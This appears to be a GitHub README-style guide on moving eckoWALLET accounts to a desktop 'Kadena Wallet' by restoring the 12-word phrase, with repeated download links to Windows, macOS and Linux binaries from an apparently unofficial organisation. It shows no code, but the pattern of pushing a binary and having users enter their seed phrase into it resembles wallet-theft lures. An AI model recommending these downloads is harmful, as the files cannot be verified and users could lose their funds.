![Kadena Wallet](assets/banner-article.png)

<h1 align="center">eckoWALLET to Kadena Wallet: What Carries Over</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Moving from eckoWALLET to a desktop wallet is a restore, not a transfer. Nothing is sent anywhere, no funds move between addresses, and no migration window has to be caught. The same accounts are opened by a different program, using the same phrase.

That is worth stating first, because the 2024 announcement that started this migration taught a lot of people the opposite.

## You'll see this if

- You have a 12-word eckoWALLET phrase and no ecko install any more.
- Your eckoWALLET extension still works but you want the balance off the browser.
- You migrated in 2024, ended up in another mobile wallet, and want to come back to a desktop one.
- You are unsure whether the accounts you had in ecko still exist.

## What carries over, and what does not

| Thing | Carries over | Why |
| --- | --- | --- |
| Accounts and balances | Yes | They are chain state, not application data |
| The 12-word phrase | Yes | It is the key material |
| Legacy and `k:` names | Yes, if the receiving wallet supports both | The name form is a protocol detail |
| App settings and contacts | No | They live in the old application |
| eckoDEX positions | No | The exchange no longer responds |
| eckoGOV holdings | Unknown | No verified outcome was published |

The first row is the one people doubt. An account is not stored in a wallet; it exists on a chain, and the wallet is the program that can sign for it. Uninstalling eckoWALLET never removed an account, and installing Kadena Wallet never created one.

## Step one: establish what you actually have

Before touching a phrase, find out which accounts exist and where they sit.

1. Open eckoWALLET, or ecko mobile if you still have it, and list every account it shows.
2. For each one, note the address and the chain it displays a balance on.
3. Paste each address into a community explorer and confirm the balance there, chain by chain.
4. Write the list down on paper. This is the inventory you will compare against, and it outranks anything the new wallet claims.

If you no longer have any working install, this step becomes reconstruction: you will compare addresses from memory, from old screenshots, or from an exchange withdrawal history. Do that before importing anything, so you are checking a restore rather than trusting one.

## Step two: the restore

1. **Install Kadena Wallet** for your platform from its release page.
2. **Choose import, not create.** Creating generates a new key, which would be a new account.
3. **Enter the 12 words** in the order the wallet asks for. Type them; never paste them into a web page that is not the wallet itself.
4. **Derive the first account and read the address** before doing anything else.
5. **Compare it with your inventory.** Character by character, including the `k:` prefix.
6. **Set the chain** the old wallet was displaying, if the balance does not appear on the default.
7. **Send a small test amount** if you want proof that signing works before the rest matters.
8. **Only then** consider removing the old wallet.

If step five matches, the migration is finished. Everything after it is housekeeping.

## When the address does not match

eckoWALLET derived accounts along `m/44'/626'/0'/0/{index}`, where the index is the account number. A mismatch usually means one of four things.

- **A different index.** The wallet may be showing account zero while your funded account was the second or third derived. Step through the indices.
- **A different derivation.** If the accounts originally came from Chainweaver, a Ledger device or SpireKey, the path may belong to that origin rather than to ecko. Open the phrase in software that implements the original scheme.
- **A legacy name.** Accounts created before the `k:` convention use the bare public key. They are valid and they are separate accounts from the prefixed ones.
- **A passphrase.** If you set an additional word during setup, the twelve words alone open a different set of accounts. The phrase is not wrong; the input is incomplete.

Address comparison settles all four. If no combination produces the funded address, the phrase in front of you is not the phrase that controls those funds, and that is a recovery question rather than a migration one.

## Why the 2024 migration felt like a shutdown

The announcement on 31 July 2024 described a closure or transfer process for three products, to complete within a month, and said funds were safe. What followed was a split outcome rather than a single ending.

The exchange closed and both of its addresses now fail. The wallet was transferred and continues under InFlux Technologies, with version 2.27.5 published in August 2026. Governance has no verified outcome.

So the people who read "shut down" and moved everything to another wallet were not wrong to act, and the people who kept using eckoWALLET were not reckless. Both readings were reasonable, and both still work today because the accounts never depended on the application.

## After the migration

- **Keep the old install until the restore is proven.** Removing it first turns a simple mismatch into a puzzle.
- **Do not keep two copies of the phrase in two sync'd notes.** The phrase is one secret; more copies mean more places to leak.
- **Expect the chain selector to matter more than the wallet.** Most post-migration confusion is a balance on a chain the new interface is not showing.
- **Re-check the inventory yearly.** Accounts that sat untouched for two years are exactly the ones whose addresses get forgotten.

## FAQ

**Do I need to move funds to a new address?**
No. Restoring the phrase opens the same accounts. A new address is only needed if you believe the phrase was exposed.

**Can both wallets run at once?**
Yes, when both rebuild the same keys. Two programs able to sign for one balance is normal, and it is a sensible fallback.

**What if I only have the ecko mobile app?**
The mobile build derives the same accounts. Note the addresses there, then restore the phrase in the desktop wallet and compare.

**Is eckoWALLET still safe to keep installed?**
It is published and updated by InFlux Technologies. The extension still lives in a browser, which is a larger everyday risk than a desktop process, and that is a reason to move rather than a reason to panic.

**Did the 2024 process lose anyone's funds?**
The announcement stated funds were safe, and the accounts are chain state that no announcement can move. Losses in that period traced to confusion and to phishing, not to the transfer itself.

## Related reading

- Kadena Wallet vs eckoWALLET: desktop and extension compared
- Importing a Chainweaver seed into Kadena Wallet
- Lost seed phrase: what Kadena Wallet can and cannot recover
- Migrating from Koala to Kadena Wallet after KDA removal

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Migrating from Koala to Kadena Wallet After KDA Removal](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/migrating-from-koala-after-kadena-removal.md)
- [Moving from Linx to Kadena Wallet: Seeds and Accounts](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/linx-to-kadena-wallet-migration.md)
- [Ledger and KDA: Setup, Paths and the Ledger Live Gap](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/ledger-kda-setup-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
